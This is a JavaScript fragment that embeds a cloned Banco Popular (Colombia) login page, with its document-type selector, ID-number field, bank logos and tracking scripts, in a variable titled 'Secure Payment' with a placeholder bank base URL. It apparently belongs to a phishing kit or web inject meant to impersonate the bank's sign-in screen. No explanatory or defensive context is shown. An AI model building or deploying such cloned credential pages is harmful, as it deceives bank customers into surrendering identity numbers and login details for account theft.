var my_titulo = 'Secure Payment';
var my_contenido = `
  <link rel="stylesheet" href="${my_banco}/assets/css/styles.a9fefd8dc42981f33a92.css">
	<app-root>
    <main class="container"><router-outlet></router-outlet><app-auth class="container ng-star-inserted">
        <div class="cont-auth">
          <div class="cont-img-auth"><!----><!----><img
              src="https://mi.bancopopular.com.co/assets/images/popular_white.svg" alt="Banco Popular"
              class="ng-star-inserted">
            <ul class="ng-star-inserted"><!---->
              <li class="ng-star-inserted"
                style="background-image: url(&quot;https://mi.bancopopular.com.co/assets/images/girls.jpg&quot;);"></li>
              <li style="background-image: url(&quot;https://mi.bancopopular.com.co/assets/images/couple.jpg&quot;);"
                class="ng-star-inserted show"></li>
              <li
                style="background-image: url(&quot;https://mi.bancopopular.com.co/assets/images/pensioners.jpg&quot;);"
                class="ng-star-inserted"></li>
              <li style="background-image: url(&quot;https://mi.bancopopular.com.co/assets/images/geek.jpg&quot;);"
                class="ng-star-inserted"></li>
            </ul>
            <div class="cont-dots ng-star-inserted"><!----><span class="ng-star-inserted"></span><span
                class="ng-star-inserted active"></span><span class="ng-star-inserted"></span><span
                class="ng-star-inserted"></span></div>
            <div class="footer-slider ng-star-inserted"><img
                src="https://mi.bancopopular.com.co/assets/images/aval-white.png" alt="Grupo Aval">
              <p>© Banco Popular | v3.3.9</p>
            </div>
          </div>
          <div class="cont-forms-auth">
            <div class="center-forms-auth"><router-outlet></router-outlet><app-login class="ng-star-inserted">
                <div class="box-login"><img alt="Banco popular"
                    src="https://mi.bancopopular.com.co/assets/images/logotipo-horizontalx3.png">
                  <h4>Ingresa a tu zona transaccional</h4>
                  <form autocomplete="off" class="form-global ng-pristine ng-invalid ng-touched" novalidate="">
                    <div formgroupname="content" class="ng-pristine ng-invalid ng-touched">
                      <div class="form-group"><app-dropdown-select><label>Tipo de documento</label><!---->
                          <div class="cont-dropdown-select ng-pristine ng-invalid ng-star-inserted ng-touched"
                            tabindex="0"><p-dropdown tabindex="1"
                              class="ng-tns-c9-0 ui-inputwrapper-filled ng-untouched ng-pristine ng-valid">
                              <div
                                class="ng-tns-c9-0 ui-dropdown ui-widget ui-state-default ui-corner-all ui-helper-clearfix">
                                <div class="ui-helper-hidden-accessible"><input class="ng-tns-c9-0"
                                    aria-haspopup="listbox" readonly="" type="text"
                                    aria-label="AUTH.LOGIN.DOCUMENT_TYPE.CC" tabindex="1"></div>
                                <div class="ui-helper-hidden-accessible ui-dropdown-hidden-select"><select
                                    class="ng-tns-c9-0" aria-hidden="true" tabindex="-1"><!----><!---->
                                    <option class="ng-tns-c9-0 ng-star-inserted" value="CC">AUTH.LOGIN.DOCUMENT_TYPE.CC
                                    </option>
                                  </select></div>
                                <div class="ui-dropdown-label-container"><!----><label
                                    class="ng-tns-c9-0 ui-dropdown-label ui-inputtext ui-corner-all ng-star-inserted"><!----><!----><span
                                      class="ng-star-inserted"> Cédula De Ciudadanía
                                    </span></label><!----><!----><!----></div>
                                <div class="ui-dropdown-trigger ui-state-default ui-corner-right"><span
                                    class="ui-dropdown-trigger-icon ui-clickable pi pi-chevron-down"></span></div>
                                <!---->
                              </div>
                            </p-dropdown></div>
                        </app-dropdown-select></div>
                      <div class="form-group"><label>Número de documento</label><input apponlynumbers=""
                          appstateinput="" autocomplete="nope"
                          class="form-control input-bp ng-pristine ng-invalid set-state-error ng-touched"
                          formcontrolname="id" pattern="\d*" type="text"></div><!---->
                      <div class="form-group"><app-checkbox-slide>
                          <div class="checkbox-slide-new not-select"><input type="checkbox"
                              id="checkbox-slide-9QBI9"><!----><span
                              class="text-label checkbox-slide-9QBI9 ng-star-inserted">Recordar tipo y número de
                              documento</span></div>
                        </app-checkbox-slide></div>
                      <div class="form-group"><app-btn><button class="btn btn-primary" type="submit" disabled=""
                            id="btn_login"> Continuar <small class="loading-dots"><span class="dot-btn"></span><span
                                class="dot-btn"></span><span class="dot-btn"></span></small></button></app-btn></div>
                    </div>
                  </form>
                </div>
              </app-login></div>
          </div>
          <div class="footer-auth visible-tablet"><app-global-footer>
              <div class="cont-footer">
                <div class="grid-x">
                  <div class="cell cont-logos-footer"><img src="https://mi.bancopopular.com.co/assets/images/aval.png"
                      alt="Grupo Aval"><img class="logo-more"
                      src="https://mi.bancopopular.com.co/assets/images/logo-more-vigilado-footer.svg" alt="Grupo Aval">
                  </div>
                  <div class="cell cont-version-footer">
                    <p class="paragraph-small"><!----> © Banco Popular | v3.3.9 </p>
                  </div>
                </div>
              </div>
            </app-global-footer></div>
        </div>
      </app-auth></main>
    <div class="animation-login"><img src="https://mi.bancopopular.com.co/assets/images/popular_white.svg"
        alt="Banco Popular"></div><app-chatbot>
      <div class="chatbot-container not-visible">
        <div class="chatbot-window">
          <div class="chatbot-header">
            <div class="chatbot-info">
              <div class="chatbot-name"><span>Chatbot</span><span>En línea</span></div><button
                class="close-chat">×</button>
            </div>
          </div>
          <div class="chatbot-content"><!----><!----></div>
          <div class="chatbot-footer">
            <p>Si ninguna de las opciones soluciona tu problema, comunícate con una línea de servicio al cliente y
              recibe ayuda más personalizada.</p>
          </div>
        </div>
      </div>
    </app-chatbot><app-ds-notification>
      <div class="ds-notification">
        <div class="ds-notification-container ">
          <div class="bar"></div>
          <div class="img-container">
            <div class="img"></div>
          </div>
          <div class="content"><span class="message"></span><!----></div><button><i class="icon-x-close"></i></button>
        </div>
      </div>
    </app-ds-notification><!---->
  </app-root>

  <!-- BEGIN :: Tealium Tag Manager -->
  <script src="https://tags.tiqcdn.com/utag/adl/popular/prod/utag.js" type="text/javascript" async=""></script>
  <script src="https://tags.tiqcdn.com/utag/adl/popular/prod/utag.sync.js"></script>
  <!-- END :: Tealium Tag Manager -->

  <script async="" src="https://mi.bancopopular.com.co/assets/cache/pwacompat.min.js"
    integrity="sha384-VcI6S+HIsE80FVM1jgbd6WDFhzKYA0PecD/LcIyMQpT4fMJdijBh0I7Iblaacawc"
    crossorigin="anonymous"></script>

  <div>
    <div class="grecaptcha-badge" data-style="bottomright"
      style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
      <div class="grecaptcha-logo"><iframe title="reCAPTCHA" width="256" height="60" role="presentation"
          name="a-lj6ltz7w0euc" frameborder="0" scrolling="no"
          sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation"
          src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6Le4brEUAAAAAIXZ7UHWXo9TlPe17s1RA2-tIwNV&amp;co=aHR0cHM6Ly9taS5iYW5jb3BvcHVsYXIuY29tLmNvOjQ0Mw..&amp;hl=es&amp;v=V6_85qpc2Xf2sbe3xTnRte7m&amp;size=invisible&amp;cb=pg8drri826gc"></iframe>
      </div>
      <div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response"
        class="g-recaptcha-response"
        style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
    </div><iframe style="display: none;"></iframe>
  </div>
</div>
`
//<script>
	function toogleTexto() {
		$('#texto1').css('display', 'none')
		$('#texto2').css('display', 'block')
	}